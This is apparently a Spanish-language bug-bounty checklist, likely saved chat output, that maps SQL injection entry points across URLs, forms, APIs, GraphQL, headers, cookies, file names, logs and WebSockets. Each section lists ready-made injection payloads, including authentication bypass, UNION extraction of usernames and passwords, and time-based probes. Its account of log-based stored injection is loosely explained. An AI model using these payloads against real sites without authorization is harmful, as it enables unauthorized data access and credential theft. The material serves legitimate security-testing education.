---
tags:
---
---
# **🎯 Checklist Completa: Todos los Puntos de Entrada para SQLi en una Web (Bug Bounty)**

Para encontrar SQLi de manera eficiente en **bug bounty**, necesitas **mapear TODOS los puntos donde el sitio recibe y procesa datos**. Aquí te dejo **una lista completa** de lugares donde puedes buscar SQL Injection **hoy en día**.

---

## **🟢 1️⃣ URLs y Parámetros GET**

📌 **Qué buscar:**

- Parámetros en la URL (`id=`, `user=`, `product_id=`, `page=`, etc.)
    
- URLs "amigables" con valores (`/profile/123/`, `/home/test/`)
    
- Parámetros ocultos en redirecciones (`next=`, `return=`, etc.)
    

📌 **Ejemplo de URLs donde probar SQLi:**

```
https://target.com/profile.php?id=123
https://target.com/home/<PRUEBA AQUÍ>
https://target.com/article?id=5&lang=en
https://target.com/login.php?redirect=dashboard
```

💡 **Prueba:** `' OR 1=1 --`, `' UNION SELECT NULL, NULL --`, `'; WAITFOR DELAY '0:0:5'--` (para ver si hay retraso).

---

## **🟡 2️⃣ Formularios y Parámetros POST**

📌 **Qué buscar:**

- **Formularios de Login** (`username`, `password`)
    
- **Formularios de búsqueda** (`search`, `query`)
    
- **Formularios de contacto, registro y comentarios**
    
- **Parámetros ocultos (`hidden` fields en HTML)**
    

📌 **Ejemplo de request POST vulnerable:**

```http
POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR 1=1 --&password=1234
```

💡 **Prueba:** `admin' OR 1=1 --`, `test' AND SLEEP(5) --` (para SQLi ciega).

---

## **🟠 3️⃣ APIs REST y GraphQL**

📌 **Qué buscar:**

- **Endpoints que reciben JSON o XML** (`/api/users`, `/graphql`)
    
- **Parámetros en el cuerpo de la petición**
    
- **Consultas GraphQL (query/mutation)**
    

📌 **Ejemplo de SQLi en una API REST:**

```json
{
  "id": "1 OR 1=1 --"
}
```

📌 **Ejemplo de SQLi en GraphQL:**

```graphql
{
  user(id: "1' OR '1'='1") {
    username
    email
  }
}
```

💡 **Prueba:**

- `"1' UNION SELECT username, password FROM users --"`
    
- `1) OR pg_sleep(5) --` (para bases de datos PostgreSQL).
    

---

## **🔵 4️⃣ Headers HTTP (User-Agent, Referer, Cookie)**

📌 **Qué buscar:**

- **Si el backend guarda logs en la base de datos, puede ser vulnerable.**
    
- **Algunas aplicaciones guardan cookies en bases de datos.**
    

📌 **Ejemplo de SQLi en un header (User-Agent):**

```http
User-Agent: Mozilla/5.0' OR 1=1 --
```

📌 **Ejemplo de SQLi en cookies:**

```http
Cookie: session_id=123' OR 1=1 --
```

💡 **Prueba:**

- `User-Agent: Mozilla/5.0' UNION SELECT NULL, NULL --`
    
- `Cookie: auth_token=1' OR sleep(5) --`
    

---

## **🟣 5️⃣ Carga de Archivos (Nombre del archivo en SQL)**

📌 **Qué buscar:**

- Algunos sistemas guardan **nombres de archivos subidos en la base de datos**.
    
- Si hay SQLi, podrías manipular el nombre del archivo para inyectar código.
    

📌 **Ejemplo de nombre de archivo malicioso:**

```
evil'image.jpg' OR 1=1 --
```

💡 **Prueba:**

- Sube un archivo con un nombre `' UNION SELECT NULL, NULL --.jpg`.
    
- Mira si en la respuesta HTTP aparece modificado.
    

---

## **🟤 6️⃣ Inyecciones en Logs y Registros de Auditoría**

📌 **Qué buscar:**

- Algunas aplicaciones guardan **acciones del usuario en la base de datos**.
    
- Si los logs se insertan sin sanitización, podrías hacer **SQLi almacenado**.
    

📌 **Ejemplo de ataque:**  
1️⃣ **Intentar login con un payload SQL:**

```
admin' OR 1=1 --
```

2️⃣ Si el intento de login fallido se **guarda en la base de datos**, puede ejecutar la inyección cuando un administrador vea los logs.

💡 **Prueba:**

- `test' OR sleep(5) --` en un campo de login.
    
- `User-Agent: Mozilla/5.0' OR 1=1 --` para ver si los logs son vulnerables.
    

---

## **⚫ 7️⃣ SQLi en WebSockets (Aplicaciones en Tiempo Real)**

📌 **Qué buscar:**

- Aplicaciones modernas usan **WebSockets** para chat, notificaciones, etc.
    
- Si los datos enviados por WebSockets terminan en una consulta SQL, podría haber SQLi.
    

📌 **Ejemplo de SQLi en WebSocket:**

```json
{
  "message": "hello' OR 1=1 --",
  "user_id": "1"
}
```

💡 **Prueba:**

- Si el chat devuelve respuestas inusuales, prueba `1 UNION SELECT NULL, NULL --`.
    
- Si la aplicación tiene **retrasos**, prueba `1 OR SLEEP(5) --`.
    

---

# **🎯 Conclusión: Checklist Completo para SQLi**

|Lugar a Probar|Ejemplos|
|---|---|
|✅ URLs (GET)|`?id=123`, `/profile/123/`|
|✅ Formularios (POST)|`username=admin' OR 1=1 --`|
|✅ APIs REST|`{"id": "1' OR 1=1 --"}`|
|✅ GraphQL|`{user(id: "1' OR '1'='1") {username}}`|
|✅ Headers HTTP|`User-Agent: ' OR 1=1 --`|
|✅ Cookies|`session_id=123' OR SLEEP(5) --`|
|✅ Subida de archivos|`evil'image.jpg' OR 1=1 --`|
|✅ Logs y auditoría|`Login failed for user ' OR 1=1 --`|
|✅ WebSockets|`{"message": "hello' OR 1=1 --"}`|

💡 **Si sigues esta lista en cada sitio web, no te perderás ningún punto de entrada.** 🚀🔥

Si necesitas más detalles en un punto específico, dime y lo ajustamos. ¡A romper bases de datos (legalmente)! 😈💻
